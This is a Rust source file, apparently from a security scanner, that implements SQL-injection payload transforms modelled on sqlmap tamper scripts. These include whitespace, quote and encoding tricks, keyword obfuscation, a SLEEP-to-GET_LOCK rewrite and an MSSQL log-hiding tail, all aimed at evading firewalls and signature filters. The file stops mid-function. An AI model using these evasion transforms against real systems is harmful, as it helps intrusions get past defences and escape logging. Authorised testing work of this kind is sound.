//! Representation transformation pipeline (brief P0 §19).
//!
//! A logical test is rendered to SQL, wrapped in a boundary, then may pass
//! through a chain of *representation* transforms before HTTP serialization.
//! Every transformation is recorded so a result is reproducible: a reviewer
//! can replay the exact final string.

use serde::{Deserialize, Serialize};

/// A single representation transform.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum TransformKind {
    /// Percent-encode characters that are unsafe in a URL query.
    UrlEncode,
    /// Encode a space as `/**/` (a comment acting as whitespace).
    CommentSpace,
    /// Encode a space as `+` (form encoding).
    PlusSpace,
    /// Replace spaces with tab characters.
    TabSpace,
    /// Replace spaces with newline characters.
    NewlineSpace,
    /// Randomise the case of SQL keywords (`select` -> `SeLeCt`).
    KeywordCase,
    /// Encode selected characters as `%XX` (partial URL encoding).
    PartialUrlEncode,
    /// Wrap the value in HTML-entity-style escapes for JSON/HTML sinks.
    HtmlEntityEncode,
    /// Encode as JSON string content (escape quotes/backslashes).
    JsonEscape,
    /// Double the percent signs so an upstream decoder reveals `%XX`.
    DoubleUrlEncode,
    /// Encode as Unicode escape sequences (`\u00XX`).
    UnicodeEscape,
    /// Wrap SQL keywords in a MySQL versioned comment (`/*!50000SELECT*/`),
    /// which MySQL executes but generic filters treat as an inert comment.
    MysqlVersionedComment,
    // ── WAF-evasion transforms (2026-09-25) ──────────────────────────────
    // sqlmap ships 86 tamper scripts, many of which are near-duplicates of one
    // another. The kinds below are the *distinct* semantics, expressed as
    // typed transforms instead of string substitutions.
    //
    // Whitespace variants. A keyword separator that a filter does not model as
    // a separator is the single most productive evasion class.
    /// Replace spaces with a vertical tab (MSSQL/MySQL treat it as space).
    VerticalTabSpace,
    /// Replace spaces with a form feed.
    FormFeedSpace,
    /// Replace spaces with a carriage return.
    CarriageReturnSpace,
    /// Replace spaces with `#%0A` — MySQL: `#` opens a comment that the
    /// newline immediately closes, leaving a separator.
    Space2HashNewline,
    /// Replace spaces with `--%0A` — the same trick with a line comment.
    Space2DashNewline,
    /// Replace spaces with `/**_**/`, a block comment a naive `/**/` filter
    /// does not collapse.
    CommentSpaceVariant,
    /// Double every space (the third whitespace class in most filters).
    MultipleSpaces,
    /// Replace spaces with a rotating mix of tab, newline, form feed, carriage
    /// return and vertical tab (sqlmap's `space2randomblank`).
    Space2RandomBlank,
    /// Replace spaces with the MSSQL blank set (`space2mssqlblank`): the
    /// control characters T-SQL's lexer accepts as whitespace.
    Space2MssqlBlank,
    // Quote and literal variants.
    /// Replace `'` with the fullwidth apostrophe `%EF%BC%87` (matches `'`
    /// after a Unicode NFKC fold, but not a byte-level signature).
    ApostropheMask,
    /// Prefix `'` with a NUL byte (`%00'`).
    ApostropheNullEncode,
    /// Append a trailing NUL byte.
    AppendNullByte,
    /// Escape `'` as `\'` so a filter that only counts quotes is confused.
    EscapeQuotes,
    /// Wrap string literals in PostgreSQL dollar-quoting (`$$...$$`),
    /// removing the quote characters entirely.
    DollarQuote,
    /// Replace `'` with `%bf%27` (the "unmagic quotes" GBK trick).
    UnmagicQuotes,
    /// Encode the whole payload as base64 (for sinks that base64-decode).
    Base64Encode,
    // Encoding variants.
    /// Percent-encode every byte, not just the unsafe ones.
    CharEncode,
    /// Percent-encode as `%uXXXX` (IIS-style Unicode escape).
    CharUnicodeEncode,
    /// Escape every character as `\uXXXX`.
    CharUnicodeEscape,
    /// Encode the payload as the overlong UTF-8 form of `'` (`%c0%a7`),
    /// which some decoders normalise into an apostrophe.
    OverlongUtf8,
    /// Hex-encode numeric literals as HTML entities (`&#x41;`).
    HexEntities,
    // Token and operator variants.
    /// Wrap every keyword in a zero-versioned MySQL comment (`/*!00000SELECT*/`),
    /// the variant most signature sets forgot to also match.
    ModSecurityZeroVersioned,
    /// Also wrap function names and operators in a versioned comment, not just
    /// keywords.
    VersionedMoreKeywords,
    /// Insert `/**/` between every pair of tokens.
    RandomComments,
    /// Force the whole payload to lower case.
    Lowercase,
    /// Force the whole payload to upper case.
    Uppercase,
    /// Replace the `=` comparison operator with `LIKE`.
    EqualsToLike,
    /// Replace `>` with `NOT BETWEEN 0 AND` (defeats `>`-based signatures).
    GreaterThanToNotBetween,
    /// Wrap comparisons in `GREATEST()`.
    GreatestObfuscation,
    /// Double-encode only the percent signs (`%27` -> `%%27`), which a single
    /// upstream decode leaves as `%27` for the next layer to decode.
    PercentagePrefix,
    /// Rewrite `LIMIT m,n` as `LIMIT n OFFSET m` (no comma to filter on).
    CommaLessLimit,
    /// Rewrite `MID(a,b,c)` as `MID(a FROM b FOR c)` (no comma).
    CommaLessMid,
    /// Rewrite `CONCAT(a,b)` as `CONCAT_WS(',',a,b)`.
    ConcatToConcatWs,
    /// Rewrite `IF(a,b,c)` as `CASE WHEN a THEN b ELSE c END`.
    IfToCase,
    /// Rewrite `0xABCD` literals as `CHAR(0xAB,0xCD)`.
    Hex2Char,
    /// Rewrite `UNION ALL` as `UNION DISTINCT`.
    UnionAllToUnionDistinct,
    /// Insert `/**/` before every `(`.
    CommentBeforeParentheses,
    /// Insert `/**/` after `information_schema.` so the catalog name is split.
    InformationSchemaComment,
    /// Append the MSSQL `;sp_password` tail so credentials never reach a log.
    SpPasswordTail,
    // ── expert additions (2026-09-25): the high-value transforms sqlmap
    // ships that we did not yet express. Each is a *distinct* semantic, not a
    // near-duplicate of an existing kind, and each renders SQL we can verify
    // is well-formed — a transform we cannot render correctly is left out
    // rather than offered as a subtly-broken payload. ──────────────────────
    /// Replace the `AND`/`OR` keywords with their symbolic forms `&&`/`||`
    /// (MySQL). Defeats signatures that match the word operators.
    SymbolicLogical,
    /// Replace the `=` comparison with `RLIKE` (MySQL) — the regex-match
    /// counterpart to [`Self::EqualsToLike`], for filters that learned `LIKE`.
    EqualsToRlike,
    /// Rewrite `IFNULL(a,b)` as `IF(ISNULL(a),b,a)` (MySQL) — no `IFNULL`
    /// token for a signature to key on.
    IfNullToIfIsNull,
    /// Rewrite `IFNULL(a,b)` as `CASE WHEN ISNULL(a) THEN (b) ELSE (a) END`.
    IfNullToCaseWhenIsNull,
    /// Rewrite `SLEEP(n)` as `GET_LOCK('<alias>',n)` (MySQL) — an equivalent
    /// blocking primitive whose name no `SLEEP` filter matches.
    Sleep2GetLock,
    /// Rewrite `ORD(` as `ASCII(` (MySQL) — the same ordinal, a different name.
    Ord2Ascii,
    /// Rewrite `MID(a,b,c)` as `RIGHT(LEFT(a,b+c-1),c)` (MySQL) — no `MID`
    /// token and no comma-triplet for a signature to match.
    Mid2LeftRight,
    /// Encode every character as a decimal HTML entity (`&#39;`), for sinks
    /// that HTML-decode before the query is built.
    DecEntities,
    /// Encode only the non-alphanumeric characters as decimal HTML entities,
    /// leaving keywords legible (sqlmap's `htmlencode`).
    HtmlEncode,
    /// Replace spaces with the MySQL blank set (`space2mysqlblank`): the bytes
    /// MySQL's lexer accepts as whitespace but MSSQL's does not.
    Space2MysqlBlank,
    /// Overlong-UTF-8-encode *every* byte (`overlongutf8more`), not just the
    /// apostrophe — a decoder that normalises overlong forms restores it all.
    OverlongUtf8More,
    /// Insert `e0` between a numeric literal and a following `UNION`
    /// (`1 UNION` -> `1e0UNION`, MySQL) — the scientific-notation union trick.
    Union0e,
    /// Insert `D` between a numeric literal and `UNION` (`1 UNION` -> `1DUNION`,
    /// Oracle).
    DUnion,
    /// Insert `-.1` between a numeric literal and `UNION` (`1 UNION` ->
    /// `1-.1UNION`, MySQL) — sqlmap's `misunion`.
    MisUnion,
}

impl TransformKind {
    pub fn label(&self) -> &'static str {
        match self {
            Self::UrlEncode => "url_encode",
            Self::CommentSpace => "comment_space",
            Self::PlusSpace => "plus_space",
            Self::TabSpace => "tab_space",
            Self::NewlineSpace => "newline_space",
            Self::KeywordCase => "keyword_case",
            Self::PartialUrlEncode => "partial_url_encode",
            Self::HtmlEntityEncode => "html_entity_encode",
            Self::JsonEscape => "json_escape",
            Self::DoubleUrlEncode => "double_url_encode",
            Self::UnicodeEscape => "unicode_escape",
            Self::MysqlVersionedComment => "mysql_versioned_comment",
            // WAF-evasion transforms.
            Self::VerticalTabSpace => "vertical_tab_space",
            Self::FormFeedSpace => "form_feed_space",
            Self::CarriageReturnSpace => "carriage_return_space",
            Self::Space2HashNewline => "space2hash_newline",
            Self::Space2DashNewline => "space2dash_newline",
            Self::CommentSpaceVariant => "comment_space_variant",
            Self::MultipleSpaces => "multiple_spaces",
            Self::ApostropheMask => "apostrophe_mask",
            Self::ApostropheNullEncode => "apostrophe_null_encode",
            Self::AppendNullByte => "append_null_byte",
            Self::EscapeQuotes => "escape_quotes",
            Self::DollarQuote => "dollar_quote",
            Self::UnmagicQuotes => "unmagic_quotes",
            Self::Base64Encode => "base64_encode",
            Self::CharEncode => "char_encode",
            Self::CharUnicodeEncode => "char_unicode_encode",
            Self::CharUnicodeEscape => "char_unicode_escape",
            Self::OverlongUtf8 => "overlong_utf8",
            Self::HexEntities => "hex_entities",
            Self::ModSecurityZeroVersioned => "modsecurity_zero_versioned",
            Self::VersionedMoreKeywords => "versioned_more_keywords",
            Self::RandomComments => "random_comments",
            Self::Lowercase => "lowercase",
            Self::Uppercase => "uppercase",
            Self::EqualsToLike => "equals_to_like",
            Self::GreaterThanToNotBetween => "greater_than_to_not_between",
            Self::CommaLessLimit => "comma_less_limit",
            Self::CommaLessMid => "comma_less_mid",
            Self::ConcatToConcatWs => "concat_to_concat_ws",
            Self::IfToCase => "if_to_case",
            Self::Hex2Char => "hex2char",
            Self::UnionAllToUnionDistinct => "union_all_to_union_distinct",
            Self::CommentBeforeParentheses => "comment_before_parentheses",
            Self::InformationSchemaComment => "information_schema_comment",
            Self::SpPasswordTail => "sp_password_tail",
            Self::GreatestObfuscation => "greatest_obfuscation",
            Self::PercentagePrefix => "percentage_prefix",
            Self::Space2RandomBlank => "space2random_blank",
            Self::Space2MssqlBlank => "space2mssql_blank",
            Self::SymbolicLogical => "symbolic_logical",
            Self::EqualsToRlike => "equals_to_rlike",
            Self::IfNullToIfIsNull => "ifnull_to_if_isnull",
            Self::IfNullToCaseWhenIsNull => "ifnull_to_case_when_isnull",
            Self::Sleep2GetLock => "sleep2getlock",
            Self::Ord2Ascii => "ord2ascii",
            Self::Mid2LeftRight => "mid2leftright",
            Self::DecEntities => "dec_entities",
            Self::HtmlEncode => "html_encode",
            Self::Space2MysqlBlank => "space2mysql_blank",
            Self::OverlongUtf8More => "overlong_utf8_more",
            Self::Union0e => "union_0e",
            Self::DUnion => "d_union",
            Self::MisUnion => "mis_union",
        }
    }

    /// Whether the transform changes the SQL's meaning (as opposed to only its
    /// representation). Any transform that returns `true` must be validated by
    /// a differential before its result is trusted.
    pub fn changes_semantics(&self) -> bool {
        matches!(
            self,
            Self::EqualsToLike
                | Self::GreaterThanToNotBetween
                | Self::CommaLessLimit
                | Self::CommaLessMid
                | Self::ConcatToConcatWs
                | Self::IfToCase
                | Self::Hex2Char
                | Self::UnionAllToUnionDistinct
                | Self::GreatestObfuscation
                // Expert additions that depend on the target parser or change
                // the operator's meaning: each must be confirmed by a
                // differential before its result is trusted.
                | Self::EqualsToRlike
                | Self::SymbolicLogical
                | Self::Union0e
                | Self::DUnion
                | Self::MisUnion
        )
    }

    /// The application-order priority of this transform, mirroring sqlmap's
    /// `__priority__` tiers (HIGHEST=100 … LOWEST=-100). Higher runs *earlier*.
    ///
    /// The order is not cosmetic: a structural rewrite (`>` -> `GREATEST`, a
    /// UNION mutation) must see the raw SQL, so it runs before any whitespace
    /// or comment substitution; a whole-payload encoder must run *last* or it
    /// would encode the delimiters the later transforms need to find. Getting
    /// this wrong silently produces a payload that does not parse — which is
    /// exactly the failure sqlmap's priority system exists to prevent.
    pub fn priority(&self) -> i8 {
        match self {
            // HIGHEST — operator/structure rewrites that must see raw SQL.
            Self::EqualsToLike
            | Self::EqualsToRlike
            | Self::GreaterThanToNotBetween
            | Self::GreatestObfuscation
            | Self::IfToCase
            | Self::IfNullToIfIsNull
            | Self::IfNullToCaseWhenIsNull
            | Self::ConcatToConcatWs
            | Self::Sleep2GetLock
            | Self::Ord2Ascii
            | Self::Mid2LeftRight
            | Self::SymbolicLogical
            | Self::UnionAllToUnionDistinct
            | Self::Union0e
            | Self::DUnion
            | Self::MisUnion => 100,
            // HIGHER — versioned-comment keyword wrapping.
            Self::MysqlVersionedComment
            | Self::VersionedMoreKeywords
            | Self::ModSecurityZeroVersioned => 50,
            // HIGH — comma-less function rewrites.
            Self::CommaLessLimit | Self::CommaLessMid => 10,
            // NORMAL — case, spacing count, token splitting.
            Self::KeywordCase
            | Self::Lowercase
            | Self::Uppercase
            | Self::MultipleSpaces
            | Self::CommentBeforeParentheses
            | Self::InformationSchemaComment
            | Self::Hex2Char
            | Self::EscapeQuotes
            | Self::UnmagicQuotes => 0,
            // LOW — whitespace-separator and comment substitutions, base64.
            Self::CommentSpace
            | Self::CommentSpaceVariant
            | Self::PlusSpace
            | Self::TabSpace
            | Self::NewlineSpace
            | Self::VerticalTabSpace
            | Self::FormFeedSpace
            | Self::CarriageReturnSpace
            | Self::Space2HashNewline
            | Self::Space2DashNewline
            | Self::Space2RandomBlank
            | Self::Space2MssqlBlank
            | Self::Space2MysqlBlank
            | Self::RandomComments
            | Self::DollarQuote
            | Self::Base64Encode => -10,
            // LOWEST — whole-payload encoders and tail markers: they must run
            // last, over the already-transformed string.
            Self::UrlEncode
            | Self::PartialUrlEncode
            | Self::DoubleUrlEncode
            | Self::CharEncode
            | Self::CharUnicodeEncode
            | Self::CharUnicodeEscape
            | Self::UnicodeEscape
            | Self::HtmlEntityEncode
            | Self::HtmlEncode
            | Self::HexEntities
            | Self::DecEntities
            | Self::JsonEscape
            | Self::ApostropheMask
            | Self::ApostropheNullEncode
            | Self::OverlongUtf8
            | Self::OverlongUtf8More
            | Self::PercentagePrefix
            | Self::AppendNullByte
            | Self::SpPasswordTail => -100,
        }
    }
}

/// Where a transform is appropriate.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum RepresentationContext {
    /// A URL query parameter value.
    QueryValue,
    /// A form-urlencoded body field.
    FormValue,
    /// A JSON body string value.
    JsonString,
    /// An HTTP header value.
    HeaderValue,
    /// A cookie value.
    CookieValue,
    /// A path segment.
    PathSegment,
}

/// A recorded transformation step, so the final string is explainable.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct TransformationTrace {
    pub original: String,
    pub steps: Vec<TransformKind>,
    pub final_representation: String,
}

impl TransformationTrace {
    pub fn new(original: impl Into<String>) -> Self {
        let original = original.into();
        Self {
            final_representation: original.clone(),
            original,
            steps: Vec::new(),
        }
    }

    /// Apply a transform, recording it.
    pub fn apply(mut self, kind: TransformKind) -> Self {
        self.final_representation = apply_transform(&self.final_representation, kind);
        self.steps.push(kind);
        self
    }

    /// Human summary like `url_encode+keyword_case`.
    pub fn summary(&self) -> String {
        if self.steps.is_empty() {
            "identity".to_string()
        } else {
            self.steps
                .iter()
                .map(|s| s.label())
                .collect::<Vec<_>>()
                .join("+")
        }
    }
}

/// SQL keywords whose case may be randomised without changing semantics.
const SQL_KEYWORDS: &[&str] = &[
    "SELECT", "UNION", "WHERE", "AND", "OR", "FROM", "NULL", "SLEEP", "PG_SLEEP",
    "WAITFOR", "DELAY", "CASE", "WHEN", "THEN", "ELSE", "END", "ORDER", "BY", "GROUP",
    "HAVING", "LIMIT", "OFFSET", "INTO", "VALUES",
];

/// Apply one transform to a string.
pub fn apply_transform(input: &str, kind: TransformKind) -> String {
    match kind {
        TransformKind::UrlEncode => percent_encode(input, false),
        TransformKind::DoubleUrlEncode => percent_encode(&percent_encode(input, true), true),
        TransformKind::PartialUrlEncode => {
            // Encode only quote/space/semicolon — the characters filters
            // most often look for, without encoding the whole payload.
            percent_encode_selected(input, " '\";=")
        }
        TransformKind::CommentSpace => input.replace(' ', "/**/"),
        TransformKind::PlusSpace => input.replace(' ', "+"),
        TransformKind::TabSpace => input.replace(' ', "\t"),
        TransformKind::NewlineSpace => input.replace(' ', "\n"),
        TransformKind::KeywordCase => {
            let mut out = input.to_string();
            for kw in SQL_KEYWORDS {
                out = replace_case_insensitive(&out, kw, &mixed_case(kw));
            }
            out
        }
        TransformKind::HtmlEntityEncode => input
            .replace('&', "&amp;")
            .replace('<', "&lt;")
            .replace('>', "&gt;")
            .replace('\'', "&#39;")
            .replace('"', "&quot;"),
        TransformKind::JsonEscape => input.replace('\\', "\\\\").replace('"', "\\\""),
        TransformKind::UnicodeEscape => input
            .chars()
            .map(|c| {
                if c.is_ascii_alphanumeric() || c == ' ' {
                    c.to_string()
                } else {
                    format!("\\u{:04X}", c as u32)
                }
            })
            .collect(),
        TransformKind::MysqlVersionedComment => {
            let mut out = input.to_string();
            for kw in SQL_KEYWORDS {
                out = replace_case_insensitive(&out, kw, &format!("/*!50000{kw}*/"));
            }
            out
        }
        // ── whitespace variants ──────────────────────────────────────────
        // Every one of these is still a valid keyword separator, so the SQL
        // keeps its meaning while the byte pattern a signature looks for
        // (`keyword SPACE keyword`) no longer appears.
        TransformKind::VerticalTabSpace => input.replace(' ', "\u{000b}"),
        TransformKind::FormFeedSpace => input.replace(' ', "\u{000c}"),
        TransformKind::CarriageReturnSpace => input.replace(' ', "\r"),
        TransformKind::Space2HashNewline => input.replace(' ', "#\n"),
        TransformKind::Space2DashNewline => input.replace(' ', "--\n"),
        TransformKind::CommentSpaceVariant => input.replace(' ', "/**_**/"),
        TransformKind::MultipleSpaces => input.replace(' ', "   "),
        // ── quote and literal variants ───────────────────────────────────
        TransformKind::ApostropheMask => input.replace('\'', "%EF%BC%87"),
        TransformKind::ApostropheNullEncode => input.replace('\'', "%00'"),
        TransformKind::AppendNullByte => format!("{input}%00"),
        TransformKind::EscapeQuotes => input.replace('\'', "\\'"),
        TransformKind::DollarQuote => dollar_quote(input),
        TransformKind::UnmagicQuotes => input.replace('\'', "%bf%27"),
        TransformKind::Base64Encode => base64_encode(input),
        // ── encoding variants ────────────────────────────────────────────
        TransformKind::CharEncode => percent_encode(input, true),
        TransformKind::CharUnicodeEncode => {
            input.chars().map(|c| format!("%u{:04X}", c as u32)).collect()
        }
        TransformKind::CharUnicodeEscape => {
            input.chars().map(|c| format!("\\u{:04X}", c as u32)).collect()
        }
        TransformKind::OverlongUtf8 => input.replace('\'', "%c0%a7"),
        TransformKind::HexEntities => {
            input.chars().map(|c| format!("&#x{:02X};", c as u32)).collect()
        }
        // ── token and operator variants ──────────────────────────────────
        TransformKind::ModSecurityZeroVersioned => {
            let mut out = input.to_string();
            for kw in SQL_KEYWORDS {
                out = replace_case_insensitive(&out, kw, &format!("/*!00000{kw}*/"));
            }
            out
        }
        TransformKind::VersionedMoreKeywords => {
            let mut out = input.to_string();
            for kw in SQL_KEYWORDS.iter().chain(SQL_FUNCTIONS.iter()).copied() {
                out = replace_case_insensitive(&out, kw, &format!("/*!50000{kw}*/"));
            }
            out
        }
        TransformKind::RandomComments => input
            .replace(" (", "/**/(")
            .replace(") ", ")/**/")
            .replace(' ', "/**/"),
        TransformKind::Lowercase => input.to_lowercase(),
        TransformKind::Uppercase => input.to_uppercase(),
        TransformKind::EqualsToLike => equals_to_like(input),
        TransformKind::GreaterThanToNotBetween => input.replace('>', " NOT BETWEEN 0 AND "),
        TransformKind::CommaLessLimit => commaless_limit(input),
        TransformKind::CommaLessMid => commaless_mid(input),
        TransformKind::ConcatToConcatWs => replace_case_insensitive(input, "CONCAT(", "CONCAT_WS(',',"),
        TransformKind::IfToCase => if_to_case(input),
        TransformKind::Hex2Char => hex2char(input),
        TransformKind::UnionAllToUnionDistinct => {
            replace_case_insensitive(input, "UNION ALL", "UNION DISTINCT")
        }
        TransformKind::CommentBeforeParentheses => input.replace('(', "/**/("),
        TransformKind::InformationSchemaComment => replace_case_insensitive(
            input,
            "information_schema.",
            "information_schema./**/",
        ),
        TransformKind::SpPasswordTail => format!("{input}-- {SP_PASSWORD_TAIL}"),
        TransformKind::GreatestObfuscation => greatest_obfuscation(input),
        TransformKind::PercentagePrefix => input.replace('%', "%%"),
        // Both blank sets are whitespace to the target engine and to nothing
        // else, which is the point: the separator a signature looks for is gone.
        TransformKind::Space2RandomBlank => {
            rotate_blanks(input, &['\t', '\n', '\u{000c}', '\r', '\u{000b}'])
        }
        TransformKind::Space2MssqlBlank => rotate_blanks(
            input,
            &[
                '\u{0001}', '\u{0002}', '\u{0003}', '\u{0004}', '\u{0005}', '\u{0006}',
                '\u{0007}', '\u{0008}', '\u{0009}', '\u{000a}', '\u{000b}', '\u{000c}',
                '\u{000e}',
            ],
        ),
        // ── expert additions ─────────────────────────────────────────────
        // MySQL accepts `&&`/`||` for AND/OR; the words a signature keys on
        // disappear while the boolean logic is unchanged (MySQL/MariaDB only).
        TransformKind::SymbolicLogical => symbolic_logical(input),
        // `=` -> `RLIKE`: a regex match, so this is only equivalent for the
        // matched-differential case and is flagged as semantics-changing.
        TransformKind::EqualsToRlike => equals_to_rlike(input),
        // `IFNULL(a,b)` -> `IF(ISNULL(a),b,a)` and the CASE form: equivalent
        // rewrites that dodge an `IFNULL(` signature.
        TransformKind::IfNullToIfIsNull => ifnull_rewrite(input, false),
        TransformKind::IfNullToCaseWhenIsNull => ifnull_rewrite(input, true),
        // `SLEEP(n)` -> `GET_LOCK('<alias>',n)`: an alternative MySQL time
        // primitive for when SLEEP itself is filtered. The lock name is a
        // fixed alias so the payload stays deterministic and reproducible.
        TransformKind::Sleep2GetLock => sleep_to_get_lock(input),
        // `ORD(` -> `ASCII(`: an equivalent single-byte ordinal, word-boundary
        // safe so `WORD(` is left alone.
        TransformKind::Ord2Ascii => {
            if let Some((prefix, args, rest)) = take_call(input, "ord") {
                if args.len() == 1 {
                    format!("{prefix}ASCII({}){rest}", args[0])
                } else {
                    input.to_string()
                }
            } else {
                input.to_string()
            }
        }
        // `MID(a,b,c)` -> `RIGHT(LEFT(a,(b)+(c)-1),c)`: an equivalent substring
        // built from LEFT/RIGHT, for when MID/SUBSTRING is filtered.
        TransformKind::Mid2LeftRight => mid_to_left_right(input),
        // Every character rendered as a decimal HTML entity.
        TransformKind::DecEntities => {
            input.chars().map(|c| format!("&#{};", c as u32)).collect()
        }
        // Only the non-alphanumeric characters rendered as decimal entities —
        // enough to break a signature while staying readable.
        TransformKind::HtmlEncode => input
            .chars()
            .map(|c| {
                if c.is_ascii_alphanumeric() {
                    c.to_string()
                } else {
                    format!("&#{};", c as u32)
                }
            })
            .collect(),
        TransformKind::Space2MysqlBlank => {
            rotate_blanks(input, &['\t', '\n', '\u{000b}', '\u{000c}', '\r'])
        }
        // Overlong two-byte UTF-8 for every byte: valid to a lax decoder,
        // unrecognisable to a signature written against the ASCII form.
        TransformKind::OverlongUtf8More => input
            .bytes()
            .map(|b| format!("%{:02X}%{:02X}", 0xC0 | (b >> 6), 0x80 | (b & 0x3F)))
            .collect(),
        // Glue a numeric literal to UNION so the space between them is gone
        // and the parser still reads `<number><UNION>`:
        //   `1 UNION` -> `1e0UNION` (scientific-notation zero exponent),
        //   `1 UNION` -> `1DUNION`  (Oracle double-precision `D` suffix),
        //   `1 UNION` -> `1-.1UNION` (arithmetic; changes the operand value,
        //                             so MisUnion is flagged semantics-changing).
        TransformKind::Union0e => union_number_glue(input, "e0"),
        TransformKind::DUnion => union_number_glue(input, "D"),
        TransformKind::MisUnion => union_number_glue(input, "-.1"),
    }
}

fn percent_encode(input: &str, encode_all_unsafe: bool) -> String {
    let mut out = String::with_capacity(input.len());
    for byte in input.bytes() {
        let safe = byte.is_ascii_alphanumeric()
            || byte == b'-'
            || byte == b'_'
            || byte == b'.'
            || byte == b'~'
            || (!encode_all_unsafe && byte == b'*');
        if safe {
            out.push(byte as char);
        } else {
            out.push_str(&format!("%{byte:02X}"));
        }
    }
    out
}

fn percent_encode_selected(input: &str, chars: &str) -> String {
    let mut out = String::with_capacity(input.len());
    for ch in input.chars() {
        if chars.contains(ch) {
            for byte in ch.to_string().bytes() {
                out.push_str(&format!("%{byte:02X}"));
            }
        } else {
            out.push(ch);
        }
    }
    out
}

/// `select` -> `SeLeCt` (deterministic so tests are stable).
fn mixed_case(keyword: &str) -> String {
    keyword
        .chars()
        .enumerate()
        .map(|(i, c)| {
            if i % 2 == 0 {
                c.to_ascii_uppercase()
            } else {
                c.to_ascii_lowercase()
            }
        })
        .collect()
}

/// Replace every space with the next character of `set`, cycling.
///
/// sqlmap picks a random blank per space; cycling keeps the transform
/// deterministic so any finding stays reproducible, while still producing a
/// byte pattern no signature is written against.
fn rotate_blanks(input: &str, set: &[char]) -> String {
    if set.is_empty() {
        return input.to_string();
    }
    let mut out = String::with_capacity(input.len());
    let mut i = 0usize;
    for ch in input.chars() {
        if ch == ' ' {
            out.push(set[i % set.len()]);
            i += 1;
        } else {
            out.push(ch);
        }
    }
    out
}

fn replace_case_insensitive(haystack: &str, needle: &str, replacement: &str) -> String {
    let mut result = String::with_capacity(haystack.len());
    let lower_hay = haystack.to_lowercase();
    let lower_needle = needle.to_lowercase();
    let mut i = 0;
    while i < haystack.len() {
        if lower_hay[i..].starts_with(&lower_needle) {
            result.push_str(replacement);
            i += needle.len();
        } else {
            // Advance one UTF-8 char boundary.
            let ch = haystack[i..].chars().next().unwrap();
            result.push(ch);
            i += ch.len_utf8();
        }
    }
    result
}

/// SQL function names worth versioning or splitting (in addition to the
/// keyword list above).
const SQL_FUNCTIONS: &[&str] = &[
    "CONCAT", "EXTRACTVALUE", "UPDATEXML", "GTID_SUBSET", "UUID_TO_BIN", "JSON_KEYS", "RAND",
    "FLOOR", "BENCHMARK", "COUNT", "CAST", "CONVERT", "CHAR", "MID", "SUBSTR", "SUBSTRING",
    "GROUP_CONCAT", "STRING_AGG", "RLIKE", "IF", "IIF",
];

/// The MSSQL tail that keeps an injected statement out of the server log.
const SP_PASSWORD_TAIL: &str = "sp_password";

/// The standard base64 alphabet.
const BASE64_ALPHABET: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

/// Standard base64 (with padding).
fn base64_encode(input: &str) -> String {
    let bytes = input.as_bytes();
    let mut out = String::with_capacity((bytes.len() + 2) / 3 * 4);
    for chunk in bytes.chunks(3) {
        let b = [chunk[0], *chunk.get(1).unwrap_or(&0), *chunk.get(2).unwrap_or(&0)];
        let n = u32::from(b[0]) << 16 | u32::from(b[1]) << 8 | u32::from(b[2]);
        out.push(BASE64_ALPHABET[(n >> 18 & 0x3f) as usize] as char);
        out.push(BASE64_ALPHABET[(n >> 12 & 0x3f) as usize] as char);
        out.push(if chunk.len() > 1 {
            BASE64_ALPHABET[(n >> 6 & 0x3f) as usize] as char
        } else {
            '='
        });
        out.push(if chunk.len() > 2 {
            BASE64_ALPHABET[(n & 0x3f) as usize] as char
        } else {
            '='
        });
    }
    out
}

/// PostgreSQL dollar-quoting: replace each single-quoted literal with
/// `$$literal$$`, so the payload contains no quote character at all.
fn dollar_quote(input: &str) -> String {
    let mut out = String::with_capacity(input.len() + 8);
    let mut inside = false;
    for ch in input.chars() {
        if ch == '\'' {
            out.push_str("$$");
            inside = !inside;
        } else {
            out.push(ch);
        }
    }
    // An unbalanced literal would leave a dangling `$$`; close it so the
    // result is still parseable.
    if inside {
        out.push_str("$$");
    }
    out
}

/// Replace a bare `=` comparison with `LIKE`, leaving `!=`, `<=`, `>=`, `==`
/// and `=>` untouched.
fn equals_to_like(input: &str) -> String {
    let chars: Vec<char> = input.chars().collect();
    let mut out = String::with_capacity(input.len() + 16);
    for (i, &c) in chars.iter().enumerate() {
        if c == '=' {
            let prev = if i > 0 { chars[i - 1] } else { ' ' };
            let next = chars.get(i + 1).copied().unwrap_or(' ');
            if matches!(prev, '!' | '<' | '>' | '=') || next == '=' {
                out.push(c);
                continue;
            }
            out.push_str(" LIKE ");
        } else {
            out.push(c);
        }
    }
    out
}

/// Split the first `name(a,b,c)` call at paren depth 0.
///
/// Returns `(prefix, arguments, suffix)`. The name must sit on a word boundary,
/// so `IF` does not match inside `IIF` or `ident`.
fn take_call(input: &str, name: &str) -> Option<(String, Vec<String>, String)> {
    let lower = input.to_lowercase();
    let needle = format!("{}(", name.to_lowercase());
    let mut search_from = 0usize;
    let start = loop {
        let idx = lower[search_from..].find(&needle)? + search_from;
        let before_ok = idx == 0
            || !input[..idx]
                .chars()
                .next_back()
                .map(|c| c.is_alphanumeric() || c == '_')
                .unwrap_or(false);
        if before_ok {
            break idx;
        }
        search_from = idx + 1;
    };
    let open = start + name.len();
    let mut depth = 0usize;
    let mut args: Vec<String> = Vec::new();
    let mut current = String::new();
    for (offset, ch) in input[open..].char_indices() {
        match ch {
            '(' => {
                depth += 1;
                if depth > 1 {
                    current.push(ch);
                }
            }
            ')' => {
                depth -= 1;
                if depth == 0 {
                    args.push(current.clone());
                    return Some((input[..start].to_string(), args, input[open + offset + 1..].to_string()));
                }
                current.push(ch);
            }
            ',' if depth == 1 => {
                args.push(current.clone());
                current.clear();
            }
            _ => current.push(ch),
        }
    }
    None
}

/// Rewrite `LIMIT m,n` as `LIMIT n OFFSET m`, removing the comma.
fn commaless_limit(input: &str) -> String {
    let lower = input.to_lowercase();
    let Some(pos) = lower.find("limit") else {
        return input.to_string();
    };
    let after = &input[pos + 5..];
    let token: String = after
        .chars()
        .skip_while(|c| c.is_whitespace())
        .take_while(|c| c.is_ascii_digit() || *c == ',')
        .collect();
    let parts: Vec<&str> = token.split(',').collect();
    if parts.len() == 2
        && parts
            .iter()
            .all(|p| !p.is_empty() && p.chars().all(|c| c.is_ascii_digit()))
    {
        let skipped = after.len() - after.trim_start().len();
        let rest = &after[skipped + token.len()..];
        return format!(
